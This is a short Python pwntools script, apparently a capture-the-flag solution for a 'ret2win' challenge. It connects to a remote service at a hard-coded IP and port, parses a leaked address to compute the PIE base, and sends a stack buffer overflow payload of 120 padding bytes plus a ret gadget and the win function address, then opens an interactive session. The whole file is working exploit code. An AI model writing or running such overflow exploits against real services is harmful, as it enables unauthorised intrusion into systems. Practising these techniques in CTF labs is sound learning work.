from pwn import *
exe = './ret2win'
context.log_level='DEBUG'
# p = process(exe)
p = remote('103.185.44.122', 19003)
p.recvuntil(b'you: ')
get = p.recvline().strip().decode()
leak_pie = int(get,16)
print(f' leak address {hex(leak_pie)}')
leaked_address = leak_pie-16460
print(hex(leaked_address))
ret_address = leaked_address + 0x000000000000101a
win_address = leaked_address + 0x0000000000001209  
print(f'ret address -> {hex(ret_address)}')
print(f'win address -> {hex(win_address)}')
payload = flat([
    b'A' * 120,
    p64(ret_address),
    p64(win_address)
])
p.sendlineafter(b'payload: ', payload)
p.interactive()
# pause()
# piebase = 16460 #so every address or func you need this for add the address for real address
